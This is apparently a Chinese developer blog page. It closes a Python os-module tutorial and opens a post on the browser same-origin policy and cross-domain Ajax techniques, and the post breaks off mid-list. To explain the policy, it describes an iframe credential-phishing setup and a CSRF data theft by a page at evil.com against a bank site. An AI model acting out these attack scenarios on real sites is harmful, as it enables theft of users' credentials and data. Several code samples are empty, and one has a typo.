<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假定 /tmp/foo.txt 文件存在，并有读写权限</span></span><br><span class="line"></span><br><span class="line">ret = os.access(<span class="string">"/tmp/foo.txt"</span>, os.F_OK)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"F_OK - 返回值 %s"</span>% ret)</span><br><span class="line"></span><br><span class="line">ret = os.access(<span class="string">"/tmp/foo.txt"</span>, os.R_OK)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"R_OK - 返回值 %s"</span>% ret)</span><br><span class="line"></span><br><span class="line">ret = os.access(<span class="string">"/tmp/foo.txt"</span>, os.W_OK)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"W_OK - 返回值 %s"</span>% ret)</span><br><span class="line"></span><br><span class="line">ret = os.access(<span class="string">"/tmp/foo.txt"</span>, os.X_OK)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"X_OK - 返回值 %s"</span>% ret)</span><br></pre></td></tr></table></figure>

<p>返回值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F_OK - 返回值 <span class="literal">True</span></span><br><span class="line">R_OK - 返回值 <span class="literal">True</span></span><br><span class="line">W_OK - 返回值 <span class="literal">True</span></span><br><span class="line">X_OK - 返回值 <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="2-python3-os-chdir-方法"><a href="#2-python3-os-chdir-方法" class="headerlink" title="2.python3 os.chdir()方法"></a>2.python3 os.chdir()方法</h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p>os.chdir() 方法用于改变当前工作目录到指定的路径。</p>
<h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.chdir(path)</span><br></pre></td></tr></table></figure>

<h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><ul>
<li>path–要切换到的新路径</li>
</ul>
<h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>如果允许访问返回True，否则返回False</p>
<h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.4</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line">path = <span class="string">'C:/Users/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前目录</span></span><br><span class="line">retval = os.getcwd()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'当前的目录为%s'</span>%retval)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改当前目录</span></span><br><span class="line">os.chdir(path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看修改后的当前目录</span></span><br><span class="line">retval = os.getcwd()</span><br><span class="line">print(<span class="string">'目录修改成功%s'</span>%retval)</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565146492595.png" alt="1565146492595"></p>
<p>os模块主要处理操作系统的相关的功能<br>  os.name           获取操作系统平台<br>  os.getcwd()       获取现在的工作目录<br>  os.listdir()      获取某个目录下的所有文件名<br>  os.system()       用来运行shell命令<br>  os.remove()       删除某个文件<br>  os.path.existe()  检验给出的路径是否真地存在<br>  os.path.isfile()  判断是否为文件;若是，返回值为真<br>  os.path.isdir()   判断是否为文件夹;若是，返回值为真<br>  os.path.abspath(name)     获得绝对路径<br>  os.path.splitext()        分离文件名与扩展名<br>  os.path.split()           把一个路径拆分为目录+文件名的形式<br>  os.path.join(path,name)   连接目录与文件名或目录<br>  os.path.basename(path)    返回文件名<br>  os.path.dirname(path)     返回文件路径<br>操作系统相关调用和操作：<br>  os.environ            一个dictionary 包含环境变量的映射关系<br>  os.environ[“HOME”]    可以得到环境变量HOME的值<br>  os.chdir(dir)         改变当前目录 os.chdir(‘d:\outlook’)   注意windows下用到转义<br>  os.getcwd()           得到当前目录<br>  os.getegid()          得到有效组<br>  id os.getgid()        得到组id<br>  os.getuid()           得到用户id<br>  os.geteuid()          得到有效用户id<br>  os.setegid os.setegid() os.seteuid() os.setuid()  设置id<br>  os.getgruops()       得到用户组名称列表<br>  os.getlogin()        得到用户登录名称<br>  os.getenv            得到环境变量<br>  os.putenv            设置环境变量<br>  os.umask             设置umask<br>  os.system(cmd)       利用系统调用，运行cmd命令</p>
<p>问题（以下源码python2运行成功python3运行失败）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line">newmulv = os.getcwd()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"当前目录为%s"</span>)%newmulv</span><br></pre></td></tr></table></figure>

<p>报错内容：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565142839881.png" alt="1565142839881"></p>
<p>查找后发现，源码需改变如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os,sys</span><br><span class="line">newmulv = os.getcwd()</span><br><span class="line">print ((&quot;当前目录为%s&quot;)%newmulv)</span><br><span class="line">或者</span><br><span class="line">print (&quot;当前目录为%s&quot;%newmulv)</span><br></pre></td></tr></table></figure>

<p>再次运行：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565143029894.png" alt="1565143029894"></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/20/浏览器同源策略与Ajax跨域方法汇总/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/20/浏览器同源策略与Ajax跨域方法汇总/" itemprop="url">浏览器同源策略与Ajax跨域方法汇总</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-20T16:55:34+08:00">
                2019-05-20
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/05/20/浏览器同源策略与Ajax跨域方法汇总/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/05/20/浏览器同源策略与Ajax跨域方法汇总/" class="cy_cmt_count" data-xid="2019/05/20/浏览器同源策略与Ajax跨域方法汇总/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/05/20/浏览器同源策略与Ajax跨域方法汇总/" class="leancloud_visitors" data-flag-title="浏览器同源策略与Ajax跨域方法汇总">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="浏览器同源策略与Ajax跨域方法汇总"><a href="#浏览器同源策略与Ajax跨域方法汇总" class="headerlink" title="浏览器同源策略与Ajax跨域方法汇总"></a>浏览器同源策略与Ajax跨域方法汇总</h1><h3 id="1-Ajax开发"><a href="#1-Ajax开发" class="headerlink" title="1. Ajax开发"></a>1. Ajax开发</h3><p>Ajax:“<strong>A</strong>synchronous <strong>J</strong>avaScript  <strong>A</strong>nd <strong>X</strong>ML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。</p>
<p>Ajax=异步JavaScript和XML或者是HTML(标准通用标记语言的子集)</p>
<p>Ajax 是一种用于创建快速动态网页的技术。</p>
<p>Ajax 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。</p>
<p>通过在后台与服务器进行少量数据交换，Ajax 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>传统的网页（不使用 Ajax）如果需要更新内容，必须重载整个网页页面。</p>
<h2 id="2-什么是浏览器同源策略"><a href="#2-什么是浏览器同源策略" class="headerlink" title="2.什么是浏览器同源策略"></a>2.什么是浏览器同源策略</h2><p>同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说 Web 是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
<p>它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。</p>
<p>所谓同源是指：域名、协议、端口相同。</p>
<p>下表是相对于 <code>http://www.laixiangran.cn/home/index.html</code> 的同源检测结果：</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/9932BCD648DE4CACB29A563116CE962B?method=download&shareKey=7fad5abd13151856c933a2bc9064a83a" alt="img"></p>
<p>另外，同源策略又分为以下两种：</p>
<ol>
<li>DOM 同源策略：禁止对不同源页面 DOM 进行操作。这里主要场景是 iframe 跨域的情况，不同域名的 iframe 是限制互相访问的。</li>
<li>XMLHttpRequest 同源策略：禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求。</li>
</ol>
<h2 id="为什么要有跨域限制"><a href="#为什么要有跨域限制" class="headerlink" title="为什么要有跨域限制"></a>为什么要有跨域限制</h2><p>因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。</p>
<p>如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：</p>
<p><strong>如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：</strong></p>
<ol>
<li>做一个假网站，里面用 iframe 嵌套一个银行网站 <code>http://mybank.com</code>。</li>
<li>把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。</li>
<li>这时如果用户输入账号密码，我们的主网站可以跨域访问到 <code>http://mybank.com</code> 的 dom 节点，就可以拿到用户的账户密码了。</li>
</ol>
<p><strong>如果 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</strong></p>
<ol>
<li>用户登录了自己的银行页面 <code>http://mybank.com</code>，<code>http://mybank.com</code> 向用户的 cookie 中添加用户标识。</li>
<li>用户浏览了恶意页面 <code>http://evil.com</code>，执行了页面中的恶意 AJAX 请求代码。</li>
<li><code>http://evil.com</code> 向 <code>http://mybank.com</code> 发起 AJAX HTTP 请求，请求会默认把 <code>http://mybank.com</code> 对应 cookie 也同时发送过去。</li>
<li>银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。</li>
<li>而且由于 Ajax 在后台执行，用户无法感知这一过程。</li>
</ol>
<p>因此，有了浏览器同源策略，我们才能更安全的上网。</p>
<h2 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h2><p>从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。</p>
<h3 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h3><p>CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于<strong>简单请求</strong>。</p>
<ol>
<li>请求方法是以下三种方法之一：</li>
</ol>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<ol>
<li>HTTP的头信息不超出以下几种字段：</li>
</ol>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><ol>
<li>在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：<code>Origin: http://www.laixiangran.cn</code></li>
<li>如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：<code>Access-Control-Allow-Origin：http://www.laixiangran.cn</code></li>
<li>没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。</li>
<li>如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 <code>Access-Control-Allow-Credentials: true</code>。</li>
</ol>
<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p>
<ul>
<li>Origin：与简单的请求相同。</li>
<li>Access-Control-Request-Method: 请求自身使用的方法。</li>
<li>Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin: http://www.laixiangran.cn</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: NCZ</span><br></pre></td></tr></table></figure>

<p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p>
<ul>
<li>Access-Control-Allow-Origin：与简单的请求相同。</li>
<li>Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</li>
<li>Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</li>
<li>Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.laixiangran.cn</span><br><span class="line">Access-Control-Allow-Methods: GET, POST</span><br><span class="line">Access-Control-Allow-Headers: NCZ</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>

<p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
<h3 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h3><p>由于 <code>script</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。</p>
<p>直接通过下面的例子来说明 JSONP 实现跨域的流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</span><br><span class="line">var body = document.getElementsByTagName(&apos;body&apos;)[0];</span><br><span class="line">var script = document.gerElement(&apos;script&apos;);</span><br><span class="line">script.src = &apos;http://www.laixiangran.cn/json?callback=handleResponse&apos;;</span><br><span class="line">body.appendChild(script);</span><br><span class="line"></span><br><span class="line">// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，</span><br><span class="line">// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器</span><br><span class="line">// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</span><br></pre></td></tr></table></figure>

<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
</ul>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
<h3 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h3><p>由于 <code>img</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
<p>直接通过下面的例子来说明图像 Ping 实现跨域的流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line"></span><br><span class="line">// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本</span><br><span class="line">img.onload = img.onerror = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 请求数据通过查询字符串形式发送</span><br><span class="line">img.src = &apos;http://www.laixiangran.cn/test?name=laixiangran&apos;;</span><br></pre></td></tr></table></figure>

<h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</li>
</ul>
<h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
<h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。</p>
<p>服务器代理是万能的。</p>
<h3 id="document-domain-跨域"><a href="#document-domain-跨域" class="headerlink" title="document.domain 跨域"></a>document.domain 跨域</h3><p>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。</p>
<p>比如，有一个页面，它的地址是 <code>http://www.laixiangran.cn/a.html</code>，在这个页面里面有一个 iframe，它的 src 是 <code>http://laixiangran.cn/b.html</code>。很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。</p>
<p>这个时候，document.domain 就可以派上用场了，我们只要把 <code>http://www.laixiangran.cn/a.html</code> 和 <code>http://laixiangran.cn/b.html</code> 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：<code>a.b.laixiangran.cn</code> 中某个文档的 document.domain 可以设成 <code>a.b.laixiangran.cn</code>、<code>b.laixiangran.cn</code> 、<code>laixiangran.cn</code> 中的任意一个，但是不可以设成 <code>c.a.b.laixiangran.cn</code> ，因为这是当前域的子域，也不可以设成 <code>baidu.com</code>，因为主域已经不相同了。</p>
<p>例如，在页面 <code>http://www.laixiangran.cn/a.html</code> 中设置document.domain：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在页面 <code>http://laixiangran.cn/b.html</code> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 <code>laixiangran.cn</code>，但是还是必须显式地设置 document.domain 的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样，<code>http://www.laixiangran.cn/a.html</code> 就可以通过 js 访问到 <code>http://laixiangran.cn/b.html</code> 中的各种属性和对象了。</p>
<h3 id="window-name-跨域"><a href="#window-name-跨域" class="headerlink" title="window.name 跨域"></a>window.name 跨域</h3><p>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 <code>window.name</code> 的，每个页面对 <code>window.name</code> 都有读写的权限，<code>window.name</code> 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
<p>通过下面的例子介绍如何通过 window.name 来跨域获取数据的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="location-hash-跨域"><a href="#location-hash-跨域" class="headerlink" title="location.hash 跨域"></a>location.hash 跨域</h3><p>location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="postMessage-跨域"><a href="#postMessage-跨域" class="headerlink" title="postMessage 跨域"></a>postMessage 跨域</h3><p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。</p>
<p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p>
<p>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="为什么实际开发中会有跨域ajax请求"><a href="#为什么实际开发中会有跨域ajax请求" class="headerlink" title="为什么实际开发中会有跨域ajax请求"></a>为什么实际开发中会有跨域ajax请求</h2><p>根据上文的内容我们可以知道，由于浏览器同源政策的影响，跨域的ajax请求是不被允许。那么在实际的开发、应用中，是否有跨域ajax的场景呢？</p>
<p>答案是肯定的。</p>
<p>那么有哪些场景会有跨域ajax的需求呢？</p>
<ol>
<li>当你调用一个现有的API或公开API：想象一下，你接到了一个新需求，需要在当前开发的新闻详细页<code>http://www.yournews.com/p/123</code>展示该新闻的相关推荐。令人欣慰的是，推荐的接口已经在你们公司的其他产品线里实现了，你只需要给该接口一个<code>query</code>即可：<code>http://www.mynews.com/recommend?query=123</code>。然而问题来了——你发起了一个跨域请求。</li>
<li>前后端分离的开发模式下，在本地进行接口联调时：也许在你的项目里，你想尝试前后端分离的开发模式。你在本地开发时，mock了一些假数据来帮助自己本地开发。而有一天，你希望在本地和后端同学进行联调。此时，后端rd的接口地址和你发生了跨域问题。这阻止了你们的联调，你只能继续使用你mock的假数据。</li>
</ol>
<p>上面只是列举了存在跨域的两个最为常见的场景，这足以说明跨域请求在实际开发中确实经常出现。</p>
<h2 id="跨域的一些方案"><a href="#跨域的一些方案" class="headerlink" title="跨域的一些方案"></a>跨域的一些方案</h2><p>了解了上面的内容后，下面就来介绍一下在实践中常用的三种ajax跨域方案。这部分的实例代码可以在这里看到：<a href="https://link.jianshu.com?t=https://github.com/alienzhou/cross-domain-demo" target="_blank" rel="noopener">cross-domain-demo</a></p>
<p>假设这样一个跨域场景：目前有两个项目</p>
<ul>
<li><strong>myweb</strong>，这个就是我们目前开发的项目，是一个独立的站点。</li>
